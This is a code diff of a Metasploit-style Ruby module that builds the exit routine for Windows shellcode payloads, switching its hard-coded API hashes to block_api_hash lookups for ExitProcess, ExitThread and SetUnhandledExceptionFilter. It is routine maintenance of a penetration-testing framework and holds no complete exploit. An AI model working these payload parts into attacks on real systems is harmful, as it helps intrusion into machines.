@@ -18,7 +18,7 @@ module Payload::Windows::Exitfunk
 
     when 'seh'
       asm << %Q^
-        mov ebx, 0x#{Msf::Payload::Windows.exit_types['seh'].to_s(16)}
+        mov ebx, #{block_api_hash('kernel32.dll', 'SetUnhandledExceptionFilter')}
         push.i8 0              ; push the exit function parameter
         push ebx               ; push the hash of the exit function
         call ebp               ; SetUnhandledExceptionFilter(0)
@@ -32,7 +32,7 @@ module Payload::Windows::Exitfunk
 
     when 'thread'
       asm << %Q^
-        mov ebx, 0x#{Msf::Payload::Windows.exit_types['thread'].to_s(16)}
+        mov ebx, #{block_api_hash('kernel32.dll', 'ExitThread')}
         push #{block_api_hash("kernel32.dll", "GetVersion")}        ; hash( "kernel32.dll", "GetVersion" )
         call ebp               ; GetVersion(); (AL will = major version and AH will = minor version)
         cmp al, 6              ; If we are not running on Windows Vista, 2008 or 7
@@ -48,7 +48,7 @@ module Payload::Windows::Exitfunk
 
     when 'process', nil
       asm << %Q^
-        mov ebx, 0x#{Msf::Payload::Windows.exit_types['process'].to_s(16)}
+        mov ebx, #{block_api_hash('kernel32.dll', 'ExitProcess')}
         push.i8 0              ; push the exit function parameter
         push ebx               ; push the hash of the exit function
         call ebp               ; ExitProcess(0)
